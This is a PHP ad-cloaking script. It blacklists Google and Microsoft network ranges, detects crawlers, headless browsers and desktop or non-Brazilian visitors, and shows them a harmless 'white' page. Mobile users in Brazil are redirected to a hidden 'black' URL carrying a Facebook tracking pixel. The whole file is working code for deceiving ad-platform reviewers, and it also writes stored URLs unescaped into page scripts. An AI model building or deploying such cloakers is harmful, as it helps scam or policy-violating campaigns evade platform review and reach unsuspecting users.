<?php
// Configurações
$blacklistedAsns = ['AS15169', 'AS8075'];

// DB SQLite
$db = new PDO('sqlite:' . __DIR__ . '/cloaker.db');
$db->exec("CREATE TABLE IF NOT EXISTS settings (id INTEGER PRIMARY KEY, white_url TEXT, black_url TEXT, facebook_pixel_id TEXT DEFAULT '')");
$db->exec("CREATE TABLE IF NOT EXISTS metrics (totalVisitors INTEGER DEFAULT 0, botsBlocked INTEGER DEFAULT 0, passThrough INTEGER DEFAULT 0, sources TEXT DEFAULT '{}')");

if ($db->query("SELECT COUNT(*) FROM settings")->fetchColumn() == 0) {
    $db->exec("INSERT INTO settings (id, white_url, black_url, facebook_pixel_id) VALUES (1, '', '', '')");
}
if ($db->query("SELECT COUNT(*) FROM metrics")->fetchColumn() == 0) {
    $db->exec("INSERT INTO metrics DEFAULT VALUES");
}

// Fontes de tráfego
$allowedTrafficSources = [
    ['name' => 'Facebook', 'pattern' => '/facebook\.com|m\.facebook\.com|l\.facebook\.com|lm\.facebook\.com/'],
    ['name' => 'Google Ads', 'pattern' => '/googleads\.g\.doubleclick\.net|google\.com\/ads|youtube\.com|search\.google\.com/'],
    ['name' => 'TikTok', 'pattern' => '/tiktok\.com|utm_source=tiktok/'],
    ['name' => 'ZeroPark', 'pattern' => '/zeropark\.com/'],
    ['name' => 'Snapchat', 'pattern' => '/snapchat\.com/'],
    ['name' => 'Microsoft Ads', 'pattern' => '/bing\.com|microsoft\.com\/ads/'],
    ['name' => 'MGID', 'pattern' => '/mgid\.com/'],
    ['name' => 'Outbrain', 'pattern' => '/outbrain\.com/'],
    ['name' => 'Taboola', 'pattern' => '/taboola\.com/'],
    ['name' => 'Revcontent', 'pattern' => '/revcontent\.com/'],
    ['name' => 'PropellerAds', 'pattern' => '/propellerads\.com/'],
    ['name' => 'Traffic Factory', 'pattern' => '/trafficfactory\.biz/'],
    ['name' => 'Kwai', 'pattern' => '/kwai\.com/'],
    ['name' => 'MediaGo', 'pattern' => '/mediago\.io/'],
    ['name' => 'Newsbreak', 'pattern' => '/newsbreak\.com/'],
    ['name' => 'Twitter/X', 'pattern' => '/twitter\.com|x\.com/'],
    ['name' => 'SMS Traffic', 'pattern' => '/sms|text|utm_source=sms/']
];

// Funções
function getGeoData($ip)
{
    $ch = curl_init("https://ipapi.co/$ip/json/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true) ?? [];
}

function isCrawler($userAgent)
{
    $crawlers = ['googlebot', 'bingbot', 'facebookexternalhit', 'twitterbot', 'tiktokbot', 'slurp', 'spider', 'crawl', 'bot'];
    foreach ($crawlers as $crawler) {
        if (stripos($userAgent, $crawler) !== false)
            return true;
    }
    return false;
}

function isBot($userAgent, $geoData, $blacklistedAsns)
{
    if (isCrawler($userAgent))
        return true;
    $asn = $geoData['asn'] ?? '';
    if (in_array($asn, $blacklistedAsns))
        return true;
    if (stripos($userAgent, 'headless') !== false || empty($userAgent))
        return true;
    return false;
}

function getDeviceType($userAgent)
{
    if (preg_match('/mobile|tablet|android|iPhone|iPad|iPod|blackberry|webos|kindle|silk|opera mini/i', $userAgent)) {
        return 'mobile';
    }
    return 'desktop';
}

function getCountry($geoData)
{
    return $geoData['country_code'] ?? 'UNKNOWN';
}

// Lógica
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$queryString = $_SERVER['QUERY_STRING'] ? '?' . $_SERVER['QUERY_STRING'] : '';

$stmt = $db->prepare("SELECT * FROM settings WHERE id = 1");
$stmt->execute();
$settings = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$settings || empty($settings['white_url']) || empty($settings['black_url'])) {
    http_response_code(404);
    echo "Configuração não encontrada ou incompleta.";
    exit;
}

$db->exec("UPDATE metrics SET totalVisitors = totalVisitors + 1");

$geoData = getGeoData($ip);
$country = getCountry($geoData);
$deviceType = getDeviceType($userAgent);
$is_bot = isBot($userAgent, $geoData, $blacklistedAsns);

$referrer = $_SERVER['HTTP_REFERER'] ?? '';
$utm_source = $_GET['utm_source'] ?? '';
$source = 'Unknown';
foreach ($allowedTrafficSources as $src) {
    if (preg_match($src['pattern'], $referrer) || preg_match($src['pattern'], $utm_source)) {
        $source = $src['name'];
        break;
    }
}
$metricsStmt = $db->query("SELECT sources FROM metrics");
$sourcesJson = $metricsStmt->fetchColumn();
$sources = json_decode($sourcesJson, true) ?? [];
$sources[$source] = ($sources[$source] ?? 0) + 1;
$db->prepare("UPDATE metrics SET sources = :sources")->execute(['sources' => json_encode($sources)]);

if ($is_bot || $deviceType === 'desktop' || $country !== 'BR') {
    $db->exec("UPDATE metrics SET botsBlocked = botsBlocked + 1");
    echo <<<HTML
<!DOCTYPE html>
<html>
<head><title>Verificando...</title></head>
<body>
<script>
    var isSuspicious = navigator.webdriver || !navigator.languages || screen.width < 300 || (navigator.userAgent.match(/mobile|tablet|android|iPhone|iPad|iPod|blackberry|webos|kindle|silk|opera mini/i) === null && '{$deviceType}' === 'desktop');
    if (isSuspicious) {
        window.location = '{$settings['white_url']}$queryString';
    } else {
        window.location = '{$settings['black_url']}$queryString';
    }
</script>
</body>
</html>
HTML;
    exit;
}

$db->exec("UPDATE metrics SET passThrough = passThrough + 1");

$pixel_id = $settings['facebook_pixel_id'];
if (!empty($pixel_id)) {
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
<title>Redirecionando...</title>
<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '$pixel_id');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=$pixel_id&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->
<meta http-equiv="refresh" content="0; url={$settings['black_url']}$queryString">
</head>
<body></body>
</html>
HTML;
    exit;
} else {
    header("Location: {$settings['black_url']}$queryString");
    exit;
}
?>